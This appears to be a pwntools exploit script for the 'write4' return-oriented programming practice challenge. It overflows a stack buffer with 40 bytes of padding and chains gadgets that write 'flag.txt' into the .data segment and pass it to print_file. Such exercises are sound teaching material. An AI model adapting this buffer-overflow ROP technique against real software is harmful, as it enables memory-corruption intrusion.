from pwn import *
from pprint import pprint

context.arch = "amd64"
elf = ELF("write4")
rop = ROP(elf)

offset = 40
pop_r14_r15 = p64(0x400690)
data_segment = p64(0x601028) # .data
gadget = p64(elf.symbols.usefulGadgets) # mov [r14], r15
pop_rdi = p64(0x400693)
print_file = p64(elf.plt.print_file)

payload = b'A' * 40
payload += pop_r14_r15
payload += data_segment
payload += b"flag.txt"
payload += gadget
payload += pop_rdi
payload += data_segment
payload += print_file

p = elf.process()
p.recvuntil(b">")
p.sendline(payload)
p.interactive()
